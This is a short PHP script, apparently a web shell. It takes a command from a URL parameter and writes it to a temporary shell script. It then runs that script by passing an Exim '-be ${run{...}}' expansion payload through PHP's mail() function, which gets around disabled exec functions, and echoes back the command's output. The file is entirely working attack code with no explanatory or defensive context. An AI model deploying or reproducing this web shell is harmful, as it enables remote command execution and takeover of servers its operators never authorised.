<?php
$c = @$_GET['lemon'];
$result_file = "/tmp/test.txt";
$tmp_file = '/tmp/aaaaaaaaaaa.sh';
$command = $c . '>' . $result_file;
file_put_contents($tmp_file, $command);
$payload = "-be \${run{/bin/bash\${substr{10}{1}{\$tod_log}}/tmp/aaaaaaaaaaa.sh}{ok}{error}}";
mail("a@localhost", "", "", "", $payload);
echo file_get_contents($result_file);
@unlink($tmp_file);
@unlink($result_file);
?>